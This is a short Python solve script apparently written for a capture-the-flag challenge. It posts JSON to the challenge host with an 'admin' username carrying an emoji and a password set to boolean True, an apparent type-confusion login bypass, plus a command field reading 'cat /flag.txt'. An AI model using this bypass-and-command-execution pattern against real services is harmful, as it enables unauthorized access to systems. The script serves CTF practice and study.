import requests
import json

url = 'https://a194-laender--mark-forster-2350.ctf.kitctf.de'

headers = {"User-Agent": "friendlyHuman"}

myjson = json.dumps({
    "user":"admin🤠",
    "password":True,
    "command":"cat /flag.txt"
})
data = {"data": myjson}

x = requests.post(url,headers=headers,data=data)

print(x.text)